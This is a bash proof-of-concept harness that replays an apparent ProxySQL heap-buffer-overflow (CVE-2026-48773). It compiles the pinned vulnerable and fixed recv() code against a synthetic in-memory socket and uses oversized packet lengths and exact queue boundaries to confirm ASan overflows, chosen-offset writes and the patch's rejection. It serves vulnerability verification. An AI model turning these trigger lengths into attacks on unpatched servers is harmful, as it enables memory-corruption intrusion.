#!/usr/bin/env bash
# Replay for ProxySQL CVE-2026-48773 / GHSA-58ww-865x-grpr.
# All source bytes come from the pinned public files in pins/. No daemon,
# socket, network or ProxySQL process is used: recv() is a synthetic in-memory
# collaborator. See PROVENANCE.md for the exact harness boundary.
set -uo pipefail
cd "$(dirname "$0")" || exit 2

P=pins
B=build
O=out
rm -rf "$B" "$O"
mkdir -p "$B" "$O"

pass=0
fail=0
: > "$O/trace.txt"

trace() { printf '%s\n' "$*" >> "$O/trace.txt"; }
check() {
    local name="$1" ok="$2"
    if [ "$ok" = 1 ]; then
        pass=$((pass + 1)); trace "PASS $name"
    else
        fail=$((fail + 1)); trace "FAIL $name"
    fi
}
has() { grep -qF -- "$2" "$1" && echo 1 || echo 0; }
no() { grep -qF -- "$2" "$1" && echo 0 || echo 1; }

# ---- 1. exact pin verification -------------------------------------------
check "pin_fix_patch" "$( [ "$(sha256sum "$P/fix.1cb2ecc.patch" | cut -d' ' -f1)" = e65110dda3c43b61e46ec41b4c71775119fd534c207ae1da7ce0e5ea05a1c5da ] && echo 1 || echo 0)"
for ref in v3.0.8 v3.0.9; do
    check "pin_mysql_header_$ref" "$( [ "$(sha256sum "$P/include_MySQL_Data_Stream.h.$ref" | cut -d' ' -f1)" = 63edb94b0d081b7866c8bfb009e534070bd418122176f0b48759938cf0d3c79e ] && echo 1 || echo 0)"
    check "pin_pgsql_header_$ref" "$( [ "$(sha256sum "$P/include_PgSQL_Data_Stream.h.$ref" | cut -d' ' -f1)" = 5a08a66877830797ff422fae03f55bf093b0472af597679417cba58ea5fe3af0 ] && echo 1 || echo 0)"
done
check "pin_structs_mysql_hdr" "$( [ "$(sha256sum "$P/include_proxysql_structs.h.v3.0.8" | cut -d' ' -f1)" = f6bd64312b576db3779e1ac7795e7217d4d430ffc9794c961cfda2cc2d5926c4 ] && echo 1 || echo 0)"
check "pin_mysql_vuln" "$( [ "$(sha256sum "$P/lib_mysql_data_stream.cpp.v3.0.8" | cut -d' ' -f1)" = 629ddd51c6c53ce8918721d5e6e1c8a280e4a9f73ef95614d18b67e08fa51526 ] && echo 1 || echo 0)"
check "pin_mysql_fix" "$( [ "$(sha256sum "$P/lib_mysql_data_stream.cpp.v3.0.9" | cut -d' ' -f1)" = 8ad8012fc01a1d47cea6ab97e40869d85d1a145d133a93b68a085913eaa75eb0 ] && echo 1 || echo 0)"
check "pin_pgsql_vuln" "$( [ "$(sha256sum "$P/lib_PgSQL_Data_Stream.cpp.v3.0.8" | cut -d' ' -f1)" = 7e3b3c9f7672f589f67fb27f1059498dd6cbf18a29330c5aa2b0038766956f7b ] && echo 1 || echo 0)"
check "pin_pgsql_fix" "$( [ "$(sha256sum "$P/lib_PgSQL_Data_Stream.cpp.v3.0.9" | cut -d' ' -f1)" = 40b11ca492e489ee83185c0e1956183a973e030aaf6e5cb8f179b44abf038b13 ] && echo 1 || echo 0)"

# ---- 2. assert exact asserted source lines --------------------------------
srcline() { sed -n "${2}p" "$1"; }
check "mysql_vuln_line643" "$( [ "$(srcline "$P/lib_mysql_data_stream.cpp.v3.0.8" 643)" = '	int r=0;' ] && echo 1 || echo 0)"
check "mysql_vuln_sink665" "$(has "$P/lib_mysql_data_stream.cpp.v3.0.8" 'r += recv(fd, queue_w_ptr(queueIN)+4, Hdr.pkt_length, 0);')"
check "mysql_fix_line651" "$( [ "$(srcline "$P/lib_mysql_data_stream.cpp.v3.0.9" 651)" = '	int r=0;' ] && echo 1 || echo 0)"
check "mysql_fix_guard677" "$(has "$P/lib_mysql_data_stream.cpp.v3.0.9" 'if (Hdr.pkt_length > (unsigned int)(s - 4)) {')"
check "mysql_fix_sink683" "$(has "$P/lib_mysql_data_stream.cpp.v3.0.9" 'r += recv(fd, queue_w_ptr(queueIN)+4, Hdr.pkt_length, 0);')"
check "pgsql_vuln_line504" "$( [ "$(srcline "$P/lib_PgSQL_Data_Stream.cpp.v3.0.8" 504)" = '	int r = 0;' ] && echo 1 || echo 0)"
check "pgsql_vuln_sink534" "$(has "$P/lib_PgSQL_Data_Stream.cpp.v3.0.8" 'r += recv(fd, queue_w_ptr(queueIN) + 5, length, 0);')"
check "pgsql_fix_line512" "$( [ "$(srcline "$P/lib_PgSQL_Data_Stream.cpp.v3.0.9" 512)" = '	int r = 0;' ] && echo 1 || echo 0)"
check "pgsql_fix_guard546" "$(has "$P/lib_PgSQL_Data_Stream.cpp.v3.0.9" 'if (length > (uint32_t)(s - 5)) {')"
check "pgsql_fix_sink553" "$(has "$P/lib_PgSQL_Data_Stream.cpp.v3.0.9" 'r += recv(fd, queue_w_ptr(queueIN) + 5, length, 0);')"
check "queue_capacity_32768" "$(has "$P/include_MySQL_Data_Stream.h.v3.0.8" '#define QUEUE_T_DEFAULT_SIZE	32768')"
check "mysql_hdr_bitfield" "$(has "$P/include_proxysql_structs.h.v3.0.8" 'u_int pkt_length:24, pkt_id:8;')"

# ---- 3. generate one source per pinned block ------------------------------
# name|pin file|first line|last line|#line file
blocks=(
  'mysql-vuln|lib_mysql_data_stream.cpp.v3.0.8|643|671|lib/mysql_data_stream.cpp'
  'mysql-fix|lib_mysql_data_stream.cpp.v3.0.9|651|689|lib/mysql_data_stream.cpp'
  'pgsql-vuln|lib_PgSQL_Data_Stream.cpp.v3.0.8|504|541|lib/PgSQL_Data_Stream.cpp'
  'pgsql-fix|lib_PgSQL_Data_Stream.cpp.v3.0.9|512|560|lib/PgSQL_Data_Stream.cpp'
)
gen_ok=1
for spec in "${blocks[@]}"; do
    IFS='|' read -r name file first last linedoc <<< "$spec"
    sed -n "${first},${last}p" "$P/$file" > "$B/$name.block"
    { printf '#line %s "%s"\n' "$first" "$linedoc"; cat "$B/$name.block"; } > "$B/$name.insert"
    awk -v ins="$B/$name.insert" '
        $0 == "// BEGIN PINNED FIRST-READ BLOCK" { print; while ((getline l < ins) > 0) print l; close(ins); skip=1; next }
        $0 == "// END PINNED FIRST-READ BLOCK" { skip=0 }
        !skip { print }
    ' driver.template.cpp > "$B/$name.cpp" || gen_ok=0
    # the pinned block must survive generation byte-for-byte
    if ! grep -qF 'Hdr.pkt_length' "$B/$name.cpp" && ! grep -qF 'length = (a << 24)' "$B/$name.cpp"; then gen_ok=0; fi
    def=(); [[ "$name" == mysql-* ]] && def=(-DMYSQL_FIRST_READ)
    g++ -std=c++17 -O0 -g -fno-omit-frame-pointer -w "${def[@]}" "$B/$name.cpp" -o "$B/$name" || gen_ok=0
    g++ -std=c++17 -O0 -g -fno-omit-frame-pointer -fsanitize=address -w "${def[@]}" "$B/$name.cpp" -o "$B/$name.asan" || gen_ok=0
done
check "generate_and_compile_four_pinned_variants" "$gen_ok"

# ---- 4. run cases ---------------------------------------------------------
# case|binary|proto|declared_len
cases=(
  'mysql_vuln_benign|mysql-vuln|mysql|100'
  'mysql_vuln_choice|mysql-vuln|mysql|65535'
  'mysql_vuln_asan_benign|mysql-vuln.asan|mysql|100'
  'mysql_vuln_asan_choice|mysql-vuln.asan|mysql|65535'
  'mysql_vuln_asan_boundary_ok|mysql-vuln.asan|mysql|32764'
  'mysql_vuln_asan_boundary_over|mysql-vuln.asan|mysql|32765'
  'mysql_fix_choice|mysql-fix|mysql|65535'
  'mysql_fix_benign|mysql-fix|mysql|100'
  'pgsql_vuln_benign|pgsql-vuln|pgsql|100'
  'pgsql_vuln_choice|pgsql-vuln|pgsql|100000'
  'pgsql_vuln_asan_benign|pgsql-vuln.asan|pgsql|100'
  'pgsql_vuln_asan_choice|pgsql-vuln.asan|pgsql|100000'
  'pgsql_vuln_asan_boundary_ok|pgsql-vuln.asan|pgsql|32763'
  'pgsql_vuln_asan_boundary_over|pgsql-vuln.asan|pgsql|32764'
  'pgsql_fix_choice|pgsql-fix|pgsql|100000'
  'pgsql_fix_benign|pgsql-fix|pgsql|100'
)
declare -A exit_of
for spec in "${cases[@]}"; do
    IFS='|' read -r name bin proto len <<< "$spec"
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 "$B/$bin" "$proto" "$len" > "$O/$name.log" 2>&1
    rc=$?
    exit_of[$name]=$rc
    trace "CASE $name bin=$bin proto=$proto declared=$len exit=$rc"
    grep -E '^(RECV_CALL|RESULT|BOUNDARY|FIXED_LOG) ' "$O/$name.log" >> "$O/trace.txt" || true
    if grep -q 'AddressSanitizer: heap-buffer-overflow' "$O/$name.log"; then
        err=$(grep -m1 -o 'AddressSanitizer: [a-z-]*' "$O/$name.log")
        wr=$(grep -m1 -o 'WRITE of size [0-9]*' "$O/$name.log" | tr ' ' '=')
        pn=$(grep -o 'RECV_CALL pinned_line=[0-9]*' "$O/$name.log" | tail -1)
        trace "ASAN case=$name $err $wr $pn"
    fi
done

# ---- 5. observed rungs ----------------------------------------------------
# Rung 1: deterministic trigger and exact queue boundary.
check "r1_mysql_benign_untouched" "$(has "$O/mysql_vuln_benign.log" 'UNTOUCHED=1')"
check "r1_pgsql_benign_untouched" "$(has "$O/pgsql_vuln_benign.log" 'UNTOUCHED=1')"
check "r1_mysql_asan_benign_clean" "$( [ "$(no "$O/mysql_vuln_asan_benign.log" AddressSanitizer)" = 1 ] && [ "${exit_of[mysql_vuln_asan_benign]}" = 0 ] && echo 1 || echo 0)"
check "r1_pgsql_asan_benign_clean" "$( [ "$(no "$O/pgsql_vuln_asan_benign.log" AddressSanitizer)" = 1 ] && [ "${exit_of[pgsql_vuln_asan_benign]}" = 0 ] && echo 1 || echo 0)"
check "r1_mysql_boundary_32764_clean" "$(no "$O/mysql_vuln_asan_boundary_ok.log" AddressSanitizer)"
check "r1_pgsql_boundary_32763_clean" "$(no "$O/pgsql_vuln_asan_boundary_ok.log" AddressSanitizer)"
check "r1_mysql_boundary_32765_faults" "$(has "$O/mysql_vuln_asan_boundary_over.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r1_pgsql_boundary_32764_faults" "$(has "$O/pgsql_vuln_asan_boundary_over.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r1_mysql_choice_len" "$(has "$O/mysql_vuln_choice.log" 'RECV_CALL pinned_line=665 len=65535')"
check "r1_pgsql_choice_len" "$(has "$O/pgsql_vuln_choice.log" 'RECV_CALL pinned_line=534 len=100000')"
# Rung 2: accounting failure; fixed build rejects before the second recv.
check "r2_mysql_vuln_accepts" "$(has "$O/mysql_vuln_choice.log" 'accepted=1 shut=0 recv_calls=2')"
check "r2_pgsql_vuln_accepts" "$(has "$O/pgsql_vuln_choice.log" 'accepted=1 shut=0 recv_calls=2')"
check "r2_mysql_fixed_rejects" "$(has "$O/mysql_fix_choice.log" 'rc=-1 accepted=0 shut=1 recv_calls=1')"
check "r2_pgsql_fixed_rejects" "$(has "$O/pgsql_fix_choice.log" 'rc=-1 accepted=0 shut=1 recv_calls=1')"
check "r2_mysql_fixed_log" "$(has "$O/mysql_fix_choice.log" 'FIXED_LOG Oversized first packet from client: pkt_length=65535 exceeds queue capacity (32764). Closing fd=7')"
check "r2_pgsql_fixed_log" "$(has "$O/pgsql_fix_choice.log" 'FIXED_LOG Oversized first packet from PgSQL client: length=100000 exceeds queue capacity (32763). Closing fd=7')"
check "r2_mysql_fixed_benign_ok" "$(has "$O/mysql_fix_benign.log" 'accepted=1 shut=0 recv_calls=2')"
check "r2_pgsql_fixed_benign_ok" "$(has "$O/pgsql_fix_benign.log" 'accepted=1 shut=0 recv_calls=2')"
# Rung 3: ASan corruption at the pinned sinks.
check "r3_mysql_asan_heap_overflow" "$(has "$O/mysql_vuln_asan_choice.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r3_mysql_asan_write_size" "$(has "$O/mysql_vuln_asan_choice.log" 'WRITE of size 65535')"
check "r3_mysql_asan_pinned_caller" "$(has "$O/mysql_vuln_asan_choice.log" 'lib/mysql_data_stream.cpp:665')"
check "r3_pgsql_asan_heap_overflow" "$(has "$O/pgsql_vuln_asan_choice.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r3_pgsql_asan_write_size" "$(has "$O/pgsql_vuln_asan_choice.log" 'WRITE of size 100000')"
check "r3_pgsql_asan_pinned_caller" "$(has "$O/pgsql_vuln_asan_choice.log" 'lib/PgSQL_Data_Stream.cpp:534')"
# Rung 4 INSTRUMENTED only: chosen stripes at chosen offsets past the queue.
check "r4_mysql_chosen_boundary" "$(has "$O/mysql_vuln_choice.log" 'CHOSEN_MATCH=1')"
check "r4_mysql_bytes_past" "$(has "$O/mysql_vuln_choice.log" 'bytes_past=32771')"
check "r4_pgsql_chosen_boundary" "$(has "$O/pgsql_vuln_choice.log" 'CHOSEN_MATCH=1')"
check "r4_pgsql_bytes_past" "$(has "$O/pgsql_vuln_choice.log" 'bytes_past=67237')"
check "r4_fixed_no_chosen_write" "$(has "$O/mysql_fix_choice.log" 'UNTOUCHED=1')"
check "r4_pgsql_fixed_no_chosen_write" "$(has "$O/pgsql_fix_choice.log" 'UNTOUCHED=1')"

trace "SUMMARY PASS=$pass FAIL=$fail"
sha256sum "$O/trace.txt" | cut -d' ' -f1 > "$O/trace.sha256"
printf 'PASS=%d FAIL=%d\n' "$pass" "$fail"
printf 'trace=%s/trace.txt\n' "$O"
printf 'sha256=%s\n' "$(cat "$O/trace.sha256")"
[ "$fail" -eq 0 ]
